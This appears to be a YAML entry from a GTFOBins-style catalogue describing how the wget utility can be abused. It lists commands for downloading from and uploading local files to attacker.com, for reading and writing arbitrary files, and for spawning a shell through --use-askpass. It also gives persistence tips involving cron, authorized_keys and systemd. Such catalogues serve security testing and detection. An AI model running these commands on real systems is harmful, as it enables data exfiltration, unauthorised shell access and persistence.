---
name: wget
capabilities:
- exec
- spawn
- read
- write
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: wget http://attacker.com/path/to/input-file -O /path/to/output-file
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: wget -i /path/to/input-file
  notes: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: wget -i /path/to/input-file -o /path/to/output-file
  notes: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
    chmod +x /path/to/temp-file
    wget --use-askpass=/path/to/temp-file 0
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: wget --post-file=/path/to/input-file http://attacker.com
- id: upload-2
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: wget --post-data=DATA http://attacker.com
references:
- https://gtfobins.github.io/gtfobins/wget/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
